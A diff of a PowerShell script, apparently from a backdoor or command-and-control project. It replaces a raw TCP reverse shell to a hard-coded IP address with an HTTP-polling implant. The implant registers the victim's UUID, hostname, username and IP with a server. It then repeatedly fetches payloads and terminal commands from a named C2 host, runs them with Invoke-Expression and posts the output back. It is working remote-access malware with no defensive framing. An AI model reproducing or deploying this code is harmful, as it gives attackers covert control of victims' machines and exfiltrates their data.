@@ -1,54 +1,56 @@
-$socket = new-object System.Net.Sockets.TcpClient('145.24.222.156', 413);
-if($socket -eq $null){exit 1}
-$stream = $socket.GetStream();
-$writer = new-object System.IO.StreamWriter($stream);
-$buffer = new-object System.Byte[] 1024;
-$encoding = new-object System.Text.AsciiEncoding;
-do
-{
-	$writer.Flush();
-	$read = $null;
-	$res = ""
-	while($stream.DataAvailable -or $read -eq $null) {
-		$read = $stream.Read($buffer, 0, 1024)
-	}
-	$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
-	if(!$out.equals("exit")){
-		$args = "";
-		if($out.IndexOf(' ') -gt -1){
-			$args = $out.substring($out.IndexOf(' ')+1);
-			$out = $out.substring(0,$out.IndexOf(' '));
-			if($args.split(' ').length -gt 1){
-                $pinfo = New-Object System.Diagnostics.ProcessStartInfo
-                $pinfo.FileName = "cmd.exe"
-                $pinfo.RedirectStandardError = $true
-                $pinfo.RedirectStandardOutput = $true
-                $pinfo.UseShellExecute = $false
-                $pinfo.Arguments = "/c $out $args"
-                $p = New-Object System.Diagnostics.Process
-                $p.StartInfo = $pinfo
-                $p.Start() | Out-Null
-                $p.WaitForExit()
-                $stdout = $p.StandardOutput.ReadToEnd()
-                $stderr = $p.StandardError.ReadToEnd()
-                if ($p.ExitCode -ne 0) {
-                    $res = $stderr
-                } else {
-                    $res = $stdout
-                }
-			}
-			else{
-				$res = (&"$out" "$args") | out-string;
-			}
+$uuid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
+# URL NEEDS TO BE CHANGED ONCE DEPLOYED
+
+$register_url = "http://127.0.0.1:8000/api/register/"
+
+$env:HostIP = (Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress
+
+$Body = @{
+   uuid = $uuid
+   name = $env:computername
+   description = $env:UserName
+   ip = $env:HostIP
+   status = "True"
+}
+Invoke-RestMethod -Method 'Post' -Uri $register_url -Body $body
+
+$url = "http://dilkovak-ubuntuvm.mshome.net:8000/payloads/backdoor_api/" + $uuid
+$terminal_url = "http://dilkovak-ubuntuvm.mshome.net:8000/payloads/terminal_api/" + $uuid
+$script_log_url = "http://dilkovak-ubuntuvm.mshome.net:8000/api/script_log/"
+$terminal_log_url = "http://dilkovak-ubuntuvm.mshome.net:8000/api/terminal_log/"
+$payload_search_url = "http://dilkovak-ubuntuvm.mshome.net:8000/api/payload/?payload=&payload_name="
+
+
+while ($true) {
+	Start-Sleep -Seconds 3
+	$response = Invoke-RestMethod -Method 'Get' -Uri $url
+	$terminal_response = Invoke-RestMethod -Method 'Get' -Uri $terminal_url
+	if ($response.active -eq $true -and $response.terminal -eq $false -and $uuid.equals($response.uuid)){
+		# Write-Output $response.payload
+		$payload_query_url = $payload_search_url + $response.payload_name
+		# need to convert it to json format when sending to the server
+		$payload_response = Invoke-RestMethod -Method 'Get' -Uri $payload_query_url
+		$output = Invoke-Expression $response.payload
+		if (!$output){
+			$output = "Script executed succesfully, but there was no output!"
 		}
-		else{
-			$res = (&"$out") | out-string;
+		$Body = @{content = $output
+			connection = $uuid
+			payload = $payload_response.id
 		}
-		if($res -ne $null){
-        $writer.WriteLine($res)
-    }
+		$script_post = Invoke-RestMethod -Method 'Post' -Uri $script_log_url -Body $Body
 	}
-}While (!$out.equals("exit"))
-$writer.close();
-$socket.close();
-$stream.Dispose()
+	if ($terminal_response.active -eq $true -and $terminal_response.terminal -eq $true -and $uuid.equals($terminal_response.uuid)){
+		$current_directory = Convert-Path .
+		$input_response = Invoke-Expression $terminal_response.input | ConvertTo-Json
+		if (!$input_response){
+			$input_response = "Script executed succesfully, but there was no output!"
+		}
+		$terminal_Body = @{content = $input_response
+			connection = $uuid
+			current_directory = $current_directory
+		}
+		$terminal_post = Invoke-RestMethod -Method 'Post' -Uri $terminal_log_url -Body $terminal_Body
+	}
+	
+}
